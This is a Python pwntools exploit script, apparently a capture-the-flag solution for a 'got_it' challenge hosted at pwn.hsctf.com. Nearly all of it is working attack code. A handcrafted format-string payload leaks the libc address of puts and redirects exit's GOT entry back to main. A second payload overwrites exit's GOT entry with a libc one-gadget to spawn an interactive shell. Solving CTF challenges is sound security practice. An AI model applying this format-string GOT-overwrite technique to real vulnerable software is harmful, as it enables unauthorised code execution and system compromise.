from pwn import * 
from sys import argv

def watch_offset():
    for x in range(0, 10):
        p = process('./got_it')
        log.info(x)
        p.sendline('a' * 8 + 'b' * 8 + '%{}$p'.format(x))
        p.interactive()

def main():
    context.bits = 64
    context.arch = 'amd64'
    gadgets = [0x4f2c5, 0x4f322, 0x10a38c]

    if 'remote' in argv:
        p = remote('pwn.hsctf.com', 5004)
        bin_e = ELF('./got_it')
    else:
        p = process('./got_it')
        bin_e = p.elf

    libc_e = ELF('./libc6_2.27-3ubuntu1_amd64.so')
    exit_got = bin_e.got['exit']

    # just a happy little format string merge
    # to leak puts and overwrite exit to main in a single pass :)
    #writes = {exit_got: 0x4012f9}
    #writes = {bin_e.got['atoi']: 0} # 'template' to make the %s format string
    #payload = fmtstr_payload(8, writes, write_size='short')
    payload = b'%4857c%13$lln%71c%14$hhn%12$saaa\xe0?@\x00\x00\x00\x00\x00\xa8?@\x00\x00\x00\x00\x00\xaa?@\x00\x00\x00\x00\x00'
    log.info('Sending payload')
    log.info(payload)

    # get the leak
    p.recvuntil('help me out!')
    p.sendline(payload)

    p.recvuntil(b'\xc0')
    p.recvuntil(b'\xc0')
    puts = u64(b'\xc0' + p.recv(5) + b'\x00\x00')
    libc = puts - libc_e.sym['puts']
    log.info(f'puts: {hex(puts)}')
    log.info(f'libc: {hex(libc)}')


    # use 1gadget
    writes = {exit_got: libc + gadgets[2]}
    payload = fmtstr_payload(8, writes, write_size='short')
    payload += b'\x00' * (256 - len(payload))
    p.recvuntil('help me out!')
    log.info('Sending payload')
    log.info(payload)
    p.sendline(payload)
    p.interactive()

#watch_offset()
main()
